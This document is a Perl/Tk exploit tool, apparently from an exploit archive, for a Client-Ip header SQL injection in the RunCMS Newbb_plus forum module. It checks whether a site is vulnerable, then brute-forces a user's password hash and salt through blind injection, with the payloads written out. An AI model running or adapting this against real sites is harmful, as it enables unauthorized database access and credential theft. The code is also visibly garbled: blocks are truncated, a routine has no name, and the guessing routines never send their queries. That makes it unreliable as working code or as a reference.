RunCMS Newbb_plus <= 0.92 Client IP Remote SQL Injection Exploit
================================================================



#!/usr/bin/perl

	use Tk;
	use Tk::BrowseEntry;
	use Tk::DialogBox;
	use LWP::UserAgent;

	$mw = new MainWindow(title => "UnderWHAT?!" );

	$mw->geometry ( &#039;420x383&#039; ) ;
	$mw->resizable(0,0);

	$mw->Label(-text => &#039;&#039;, -font => &#039;{Verdana} 8&#039;,-foreground=>&#039;red&#039;)->pack();
	$mw->Label(-text => &#039;Newbb_plus <= 0.92 Client Ip Sql Injection&#039;, -font => &#039;{Tahoma} 7 bold&#039;,-foreground=>&#039;red&#039;)->pack();
	$mw->Label(-text => &#039;it will take about half an hour to get hashed password&#039;, -font => &#039;{Tahoma} 7 bold&#039;,-foreground=>&#039;red&#039;)->pack();
	$mw->Label(-text => &#039;you need magic_quotes_gpc turned off and mysql version higher that 4.1&#039;, -font => &#039;{Tahoma} 7 bold&#039;,-foreground=>&#039;red&#039;)->pack();
	$mw->Label(-text => &#039;&#039;, -font => &#039;{Tahoma} 7 bold&#039;,-foreground=>&#039;red&#039;)->pack();


	$fleft  = $mw->Frame()->pack ( -side => &#039;left&#039;, -anchor => &#039;ne&#039;) ;
	$fright = $mw->Frame()->pack ( -side => &#039;left&#039;, -anchor => &#039;nw&#039;) ;

	$url      = &#039;http://test2.ru/runcms/modules/newbb_plus/&#039;;
	$user_id  = &#039;1&#039;;
	$table    = &#039;users&#039;;
	$column   = &#039;user_password&#039;;
	$report   = &#039;&#039;;
	$group    = 1;
	$curr_user = 0;
	


	$fleft->Label ( -text => &#039;Path to forum index: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$url) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;

	$fleft->Label ( -text => &#039;User ID: &#039;, -font => &#039;{Verdana} 8 bold&#039; ) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$user_id) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;


	$fleft->Label ( -text => &#039;Returned hash: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$report) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;

	$fleft->Label ( -text => &#039;Returned salt: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$salt) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;

	$fright->Label( -text => &#039; &#039;)->pack();

	$fright->Button(-text    => &#039;Test forum vulnerability&#039;,
	                -relief => "groove",
	                -width => &#039;30&#039;,
	                -font => &#039;{Verdana} 8 bold&#039;,
	                -activeforeground => &#039;red&#039;,
	                -command => \&test_vuln
	               )->pack();

	                -relief => "groove",
	                -width => &#039;30&#039;,
	                -font => &#039;{Verdana} 8 bold&#039;,
	                -activeforeground => &#039;red&#039;,
	               )->pack();
	
	$fright->Button(-text    => &#039;Get hash from database&#039;,
	                -relief => "groove",
	                -width => &#039;30&#039;,
	                -font => &#039;{Verdana} 8 bold&#039;,
	                -activeforeground => &#039;red&#039;,
	                -command => \&get_hash
	               )->pack();
				   
	$fright->Button(-text    => &#039;Get salt from database&#039;,
	                -relief => "groove",
	                -width => &#039;30&#039;,
	                -font => &#039;{Verdana} 8 bold&#039;,
	                -activeforeground => &#039;red&#039;,
	                -command => \&get_salt
	               )->pack();
				   
	$mw   ->Label(-text => &#039;&#039;, -font => &#039;{Verdana} 7 bold&#039;,-foreground=>&#039;red&#039;)->pack();
	$fleft->Label(-text => &#039;!&#039;, -font => &#039;{Webdings} 22&#039;)->pack();
	$fleft->Label(-text => &#039;Newbb_plus 0.92&#039;, -font => &#039;{Verdana} 7 bold&#039;,-foreground=>&#039;red&#039;)->pack();
	$fleft->Label(-text => &#039;client ip sql injection &#039;, -font => &#039;{Verdana} 7 bold&#039;,-foreground=>&#039;red&#039;)->pack();
	$fleft->Label(-text => &#039;mysql char bruteforcing &#039;, -font => &#039;{Verdana} 7 bold&#039;,-foreground=>&#039;red&#039;)->pack();
	$fleft->Label(-text => &#039;bug in replace function &#039;, -font => &#039;{Verdana} 7 bold&#039;,-foreground=>&#039;red&#039;)->pack();
	$fleft->Label(-text => &#039;by gemaglabin and Elekt  &#039;, -font => &#039;{Verdana} 7 bold&#039;,-foreground=>&#039;red&#039;)->pack();
	$fleft->Label(-text => &#039;( mafia of antichat.ru ) &#039;, -font => &#039;{Verdana} 7 bold&#039;,-foreground=>&#039;red&#039;)->pack();
	$fleft->Label(-text => &#039; 2007.02.04 ( fixed ) &#039;, -font => &#039;{Verdana} 7 bold&#039;,-foreground=>&#039;red&#039;)->pack();
	$fright->Label(-text => &#039;&#039;, -font => &#039;{Verdana} 3 bold&#039;,-foreground=>&#039;red&#039;)->pack();
	$print=$fright->Text(-width=>35,-height=>5,-wrap=>"word")->pack(-side=>"top",-anchor=>"s");
	
	MainLoop();
	
	sub get_hash()
	{
		srand();
		$xpl = LWP::UserAgent->new( ) or die;
		$InfoWindow=$mw->DialogBox(-title   => &#039;get hash from database&#039;, -buttons => ["OK"]);
		$i = 1;
		$b = 0;
		$report = &#039;&#039;;
		$type = get_type();
		if ($type == 0) {$len = 40;}
		if ($type == 1) {$len = 32;}
		my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
		$print->insert(&#039;end&#039;,"- Start [$hour:$min:$sec]\n");
		my @brutearray=qw(48 49 50 51 52 53 54 55 56 57 58 97 98 99 100 101 102);
		while (length($report)<$len)
		{
			$num = $brutearray[$b];
			$ret = get_pchar();
			if($ret > 0)
			{
				$print->insert(&#039;end&#039;,"- char [$num] = ".chr($num)."\n");
				$report .= chr($num);
				$b = 0;
				$i = $i +1;
				$mw->update(); 
				break;
			}
			else
			{
				$b = $b +1;
			}
		}
		my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
		$print->insert(&#039;end&#039;,"- Finish [$hour:$min:$sec]");
	}
	
	sub get_salt()
	{
		srand();
		$xpl = LWP::UserAgent->new( ) or die;
		$InfoWindow=$mw->DialogBox(-title   => &#039;get salt from database&#039;, -buttons => ["OK"]);
		$i = 1;
		$b = 0;
		$salt = &#039;&#039;;
		my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
		$print->insert(&#039;end&#039;,"- Start [$hour:$min:$sec]\n");
		my @brutearray=qw(33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126);
		while (length($salt)<4)
		{
			$num = $brutearray[$b];
			$ret = get_schar();
			if($ret > 0)
			{
				$print->insert(&#039;end&#039;,"- char [$num] = ".chr($num)."\n");
				$salt .= chr($num);
				$b = 0;
				$i = $i +1;
				$mw->update(); 
				break;
			}
			else
			{
				$b = $b +1;
			}
		}
		my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
		$print->insert(&#039;end&#039;,"- Finish [$hour:$min:$sec]");
	}
	
	sub get_pchar()
	{
		if($res->as_string =~ /DELETE FROM/i) { return 0;}
		if($res->as_string =~ /INSERT INTO/i) { return 1;}
	}
	
	sub get_type()
	{
		if($res->as_string =~ /DELETE FROM/i) { return 0;}
		if($res->as_string =~ /INSERT INTO/i) { return 1;}
	}
	
	sub get_schar()
	{
		if($res->as_string =~ /DELETE FROM/i) { return 0;}
		if($res->as_string =~ /INSERT INTO/i) { return 1;}
	}
	
	 
	sub test_vuln()
	{
		$xpl = LWP::UserAgent->new( ) or die;
		$res = $xpl->get($url,&#039;Client-Ip&#039;=>"123&#039; or 1=if(ascii(1)=49,0,(select 1 union select 5))/*");
		if($res->is_success) 
		{
			$rep = &#039;&#039;;
			if($res->as_string =~ /INSERT/i || $res->as_string =~ /DELETE/i) 
			{ 
				if($res->as_string =~ /INSERT/i)
				{$print->insert(&#039;end&#039;,"- FORUM VULNERABLE\n");}
				else { $print->insert(&#039;end&#039;,"- FORUM IS EMPTY\n");}
			}
			else { $print->insert(&#039;end&#039;,"- FORUM UNVULNERABLE\n");} 
		}
	}

	{
		$InfoWindow->add(&#039;Label&#039;, -text => &#039;&#039;, -font => &#039;{Verdana} 8&#039;)->pack;
		$InfoWindow->add(&#039;Label&#039;, -text => $url, -font => &#039;{Verdana} 8&#039;)->pack;
		$InfoWindow->add(&#039;Label&#039;, -text => &#039;&#039;, -font => &#039;{Verdana} 8&#039;)->pack;
		$xpl = LWP::UserAgent->new( ) or die;
		$res = $xpl->get($url,&#039;Client-Ip&#039;=>"&#039; union 1=1/*");
		if($res->is_success) 
		{
			$rep = &#039;&#039;;
		}
		else
		{
			$InfoWindow->add(&#039;Label&#039;, -text => &#039;Error!&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;red&#039;)->pack;
			$InfoWindow->add(&#039;Label&#039;, -text => $res->status_line, -font => &#039;{Verdana} 8&#039;)->pack;
		} 
		$InfoWindow->Show();
		$InfoWindow->destroy;   
	}



